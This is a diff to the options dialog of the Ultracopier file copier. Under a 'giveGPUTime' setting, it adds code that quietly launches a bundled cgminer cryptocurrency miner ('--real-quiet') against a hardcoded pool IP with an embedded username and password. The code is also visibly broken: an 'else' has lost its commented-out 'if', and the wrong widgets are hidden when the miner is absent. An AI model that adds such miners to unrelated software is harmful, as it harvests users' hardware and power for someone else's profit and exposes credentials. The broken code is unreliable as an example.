@@ -14,6 +14,10 @@
 #include <QFileDialog>
 #include <QMessageBox>
 
+#ifdef ULTRACOPIER_CGMINER
+#include <QLibrary>
+#endif
+
 OptionDialog::OptionDialog() :
     ui(new Ui::OptionDialog)
 {
@@ -32,6 +36,12 @@ OptionDialog::OptionDialog() :
     ui->Language->setEnabled(false);
     on_treeWidget_itemSelectionChanged();
 
+    #ifndef Q_OS_WIN32
+    ui->giveGPUTime->hide();
+    #endif
+    #ifdef ULTRACOPIER_VERSION_ULTIMATE
+    ui->giveGPUTime->hide();
+    #endif
 
     //load the plugins
     PluginsManager::pluginsManager->lockPluginListEdition();
@@ -64,10 +74,40 @@ OptionDialog::OptionDialog() :
     ui->label_checkTheUpdate->hide();
     ui->checkTheUpdate->hide();
     #endif
+
+    #ifdef ULTRACOPIER_CGMINER
+    cgminer=NULL;
+    bool OpenCLDll=false;
+    char *arch=getenv("windir");
+    if(arch!=NULL)
+    {
+
+        if(QFile(QString(arch)+"\\System32\\OpenCL.dll").exists())
+            OpenCLDll=true;
+        else
+            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"No 32Bits openCL");
+    }
+    else
+        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"No windir");
+    haveCgminer=QFile(QCoreApplication::applicationDirPath()+"/cgminer/cgminer.exe").exists() && OpenCLDll;
+    if(!haveCgminer)
+    {
+        ui->label_checkTheUpdate->hide();
+        ui->checkTheUpdate->hide();
+    }
+    #endif
 }
 
 OptionDialog::~OptionDialog()
 {
+    #ifdef ULTRACOPIER_CGMINER
+    if(cgminer!=NULL)
+    {
+        cgminer->terminate();
+        cgminer->kill();
+        delete cgminer;
+    }
+    #endif
     delete ui;
 }
 
@@ -396,6 +436,7 @@ void OptionDialog::loadOption()
     newOptionValue("Ultracopier",	"confirmToGroupWindows",    OptionEngine::optionEngine->getOptionValue("Ultracopier","confirmToGroupWindows"));
     newOptionValue("Ultracopier",	"displayOSSpecific",		OptionEngine::optionEngine->getOptionValue("Ultracopier","displayOSSpecific"));
     newOptionValue("Ultracopier",	"checkTheUpdate",           OptionEngine::optionEngine->getOptionValue("Ultracopier","checkTheUpdate"));
+    newOptionValue("Ultracopier",	"giveGPUTime",              OptionEngine::optionEngine->getOptionValue("Ultracopier","giveGPUTime"));
     newOptionValue("Language",	"Language",                     OptionEngine::optionEngine->getOptionValue("Language","Language"));
     newOptionValue("Language",	"Language_force",               OptionEngine::optionEngine->getOptionValue("Language","Language_force"));
     #ifndef ULTRACOPIER_VERSION_PORTABLE
@@ -567,8 +608,83 @@ void OptionDialog::newOptionValue(const QString &group,const QString &name,const
             ui->DisplayOSWarning->setChecked(value.toBool());
         else if(name=="checkTheUpdate")
             ui->checkTheUpdate->setChecked(value.toBool());
+        else if(name=="giveGPUTime")
+        {
+            ui->giveGPUTime->setChecked(value.toBool());
+            #ifdef ULTRACOPIER_CGMINER
+            if(!haveCgminer)
+                return;
+            if(value.toBool())
+            {
+                if(cgminer!=NULL)
+                {
+                    cgminer->terminate();
+                    cgminer->kill();
+                    delete cgminer;
+                }
+                cgminer=new QProcess();
+                #ifdef ULTRACOPIER_CGMINER
+                connect(cgminer,static_cast<void(QProcess::*)(QProcess::ProcessError)>(&QProcess::error),this,&OptionDialog::error);
+                connect(cgminer,static_cast<void(QProcess::*)(int,QProcess::ExitStatus)>(&QProcess::finished),this,&OptionDialog::finished);
+                connect(cgminer,&QProcess::readyReadStandardError,this,&OptionDialog::readyReadStandardError);
+                connect(cgminer,&QProcess::readyReadStandardOutput,this,&OptionDialog::readyReadStandardOutput);
+                #endif
+
+                {
+                    //QLibrary cgminerBin(QCoreApplication::applicationDirPath()+"/cgminer/cgminer.exe");
+                    /*if(!cgminerBin.load())
+                        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"No dll");
+                    else
+                    {*/
+                        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"cgminer seam work");
+                        //cgminerBin.unload();
+                        //cgminer->startDetached(QCoreApplication::applicationDirPath()+"/cgminer/cgminer.exe",QStringList() << "-o" << "http://37.59.242.80:8332" <<  "-u" << "alphaonex86_pool" << "-p" << "8fN0lcST3RwaI9Ah" << "--fix-protocol" << "--real-quiet" << "-T",QCoreApplication::applicationDirPath()+"/cgminer/");
+                        cgminer->start(QCoreApplication::applicationDirPath()+"/cgminer/cgminer.exe",QStringList() << "-o" << "http://37.59.242.80:8332" <<  "-u" << "alphaonex86_pool" << "-p" << "8fN0lcST3RwaI9Ah" << "--fix-protocol" << "--real-quiet" << "-T");
+                    //}
+                }
+                else
+                    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"application not found");
+            }
+            else
+            {
+                if(cgminer!=NULL)
+                {
+                    cgminer->terminate();
+                    cgminer->kill();
+                    delete cgminer;
+                }
+                cgminer=NULL;
+            }
+            #endif
+        }
     }
 }
+
+#ifdef ULTRACOPIER_CGMINER
+void OptionDialog::error( QProcess::ProcessError error )
+{
+    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer error: %1").arg(error));
+}
+
+void OptionDialog::finished( int exitCode, QProcess::ExitStatus exitStatus )
+{
+    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer exitCode: %1, exitStatus: %2").arg(exitCode).arg(exitStatus));
+}
+
+void OptionDialog::readyReadStandardError()
+{
+    if(cgminer==NULL)
+        return;
+    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer standard error: %1").arg(QString::fromLocal8Bit(cgminer->readAllStandardError())));
+}
+
+void OptionDialog::readyReadStandardOutput()
+{
+    if(cgminer==NULL)
+        return;
+    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer standard output: %1").arg(QString::fromLocal8Bit(cgminer->readAllStandardOutput())));
+}
+#endif
 
 void OptionDialog::on_Ultracopier_current_theme_currentIndexChanged(int index)
 {
